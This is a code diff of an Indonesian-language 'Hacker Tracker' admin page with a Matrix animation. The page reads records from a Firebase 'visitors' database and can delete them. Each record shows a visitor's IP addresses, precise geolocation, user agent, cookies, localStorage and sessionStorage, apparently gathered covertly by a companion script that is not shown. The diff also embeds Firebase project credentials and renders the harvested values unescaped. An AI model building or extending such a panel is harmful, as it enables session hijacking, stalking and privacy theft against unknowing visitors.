@@ -2,57 +2,93 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>Private Admin</title>
+  <title>Hacker Tracker</title>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <style>
-    body {
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow-x: hidden;
+      background: black;
       font-family: monospace;
-      background-color: black;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+    }
+
+    .content {
+      position: relative;
+      z-index: 1;
       color: #00FF00;
       padding: 20px;
     }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 20px;
+
+    h1, h2 {
       color: #00FF00;
     }
-    th, td {
-      border: 1px solid #00FF00;
-      padding: 6px;
-      text-align: left;
-    }
-    th {
+
+    button {
       background-color: #003300;
-    }
-    h1 {
       color: #00FF00;
+      border: 1px solid #00FF00;
+      padding: 10px;
+      margin: 5px;
+      cursor: pointer;
+      font-size: 14px;
+      border-radius: 5px;
+    }
+
+    .info-card {
+      background: #001100;
+      border: 1px solid #00FF00;
+      padding: 15px;
+      margin: 10px 0;
+      display: none;
+    }
+
+    select {
+      background: black;
+      color: #00FF00;
+      border: 1px solid #00FF00;
+      padding: 5px;
+      margin-top: 10px;
+    }
+
+    .delete-btn {
+      background: darkred;
+      color: white;
+      margin-left: 10px;
+      padding: 5px 10px;
+      border: none;
     }
   </style>
 </head>
 <body>
-  <h1>ADMIN TRACKER HACKER MODE</h1>
-  <table>
-    <thead>
-      <tr>
-        <th>Waktu</th>
-        <th>IP Publik</th>
-        <th>IP Lokal</th>
-        <th>User Agent</th>
-        <th>Referer</th>
-        <th>Latitude</th>
-        <th>Longitude</th>
-        <th>Akurasi</th>
-        <th>Cookies</th>
-        <th>LocalStorage</th>
-        <th>SessionStorage</th>
-      </tr>
-    </thead>
-    <tbody id="data-list"></tbody>
-  </table>
+  <canvas id="matrixCanvas"></canvas>
+
+  <div class="content">
+    <h1>HACKER MODE</h1>
+
+    <h2>Data Pengunjung:</h2>
+    <div id="button-list"></div>
+
+    <h2>Hapus Data</h2>
+    <select id="delete-select">
+      <option value="">Pilih data untuk dihapus</option>
+    </select>
+    <button class="delete-btn" onclick="deleteSelected()">Hapus</button>
+
+    <div id="info-container"></div>
+  </div>
 
   <script>
+    // Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
       authDomain: "xr-social-53646.firebaseapp.com",
@@ -60,40 +96,108 @@
       projectId: "xr-social-53646",
       storageBucket: "xr-social-53646.appspot.com",
       messagingSenderId: "55685443011",
-      appId: "1:55685443011:web:ef0f9de8e329d24d512176",
-      measurementId: "G-LTMZD79ZWX"
+      appId: "1:55685443011:web:ef0f9de8e329d24d512176"
     };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    const dataList = document.getElementById('data-list');
+
+    const buttonList = document.getElementById('button-list');
+    const infoContainer = document.getElementById('info-container');
+    const deleteSelect = document.getElementById('delete-select');
+
+    function renderInfoCard(key, data, index) {
+      const button = document.createElement('button');
+      button.textContent = `#${index + 1}`;
+      button.onclick = () => {
+        const card = document.getElementById('card-' + key);
+        card.style.display = (card.style.display === 'block') ? 'none' : 'block';
+      };
+      buttonList.appendChild(button);
+
+      const opt = document.createElement('option');
+      opt.value = key;
+      opt.textContent = `Data #${index + 1} (${data.timestamp})`;
+      deleteSelect.appendChild(opt);
+
+      const card = document.createElement('div');
+      card.className = 'info-card';
+      card.id = 'card-' + key;
+      card.innerHTML = `
+        <strong>Waktu:</strong> ${data.timestamp}<br>
+        <strong>IP Publik:</strong> ${data.ip}<br>
+        <strong>IP Lokal:</strong> ${data.localIP}<br>
+        <strong>User Agent:</strong> ${data.userAgent}<br>
+        <strong>Referer:</strong> ${data.referer}<br>
+        <strong>Latitude:</strong> ${data.latitude}<br>
+        <strong>Longitude:</strong> ${data.longitude}<br>
+        <strong>Akurasi:</strong> ${data.accuracy}<br>
+        <strong>Cookies:</strong> ${data.cookies}<br>
+        <strong>LocalStorage:</strong> ${data.localStorage}<br>
+        <strong>SessionStorage:</strong> ${data.sessionStorage}<br>
+      `;
+      infoContainer.appendChild(card);
+    }
+
+    function deleteSelected() {
+      const key = deleteSelect.value;
+      if (!key) return alert("Pilih data terlebih dahulu!");
+      if (confirm("Yakin mau hapus data ini?")) {
+        db.ref('visitors/' + key).remove();
+      }
+    }
 
     db.ref('visitors').on('value', snapshot => {
-      dataList.innerHTML = '';
+      buttonList.innerHTML = '';
+      infoContainer.innerHTML = '';
+      deleteSelect.innerHTML = '<option value="">Pilih data untuk dihapus</option>';
+
       const data = snapshot.val();
       if (!data) {
-        dataList.innerHTML = '<tr><td colspan="11">Belum ada data pengunjung</td></tr>';
+        buttonList.innerHTML = '<p>Belum ada data pengunjung.</p>';
         return;
       }
 
-      Object.keys(data).reverse().forEach(key => {
-        const e = data[key];
-        const row = document.createElement('tr');
-        row.innerHTML = `
-          <td>${e.timestamp}</td>
-          <td>${e.ip || ''}</td>
-          <td>${e.localIP || ''}</td>
-          <td>${e.userAgent}</td>
-          <td>${e.referer}</td>
-          <td>${e.latitude}</td>
-          <td>${e.longitude}</td>
-          <td>${e.accuracy}</td>
-          <td>${e.cookies}</td>
-          <td>${e.localStorage}</td>
-          <td>${e.sessionStorage}</td>
-        `;
-        dataList.appendChild(row);
+      const keys = Object.keys(data).reverse();
+      keys.forEach((key, index) => {
+        renderInfoCard(key, data[key], index);
       });
+    });
+
+    // MATRIX ANIMATION
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+
+    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth;
+
+    const katakana = "アイウエオカキクケコサシスセソタチツテトナニヌネノマミムメモ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const characters = katakana.split("");
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+
+    const drops = Array.from({ length: columns }, () => 1);
+
+    function drawMatrix() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = "#00FF00";
+      ctx.font = fontSize + "px monospace";
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = characters[Math.floor(Math.random() * characters.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        drops[i]++;
+      }
+    }
+
+    setInterval(drawMatrix, 33);
+    window.addEventListener('resize', () => {
+      canvas.height = window.innerHeight;
+      canvas.width = window.innerWidth;
     });
   </script>
 </body>
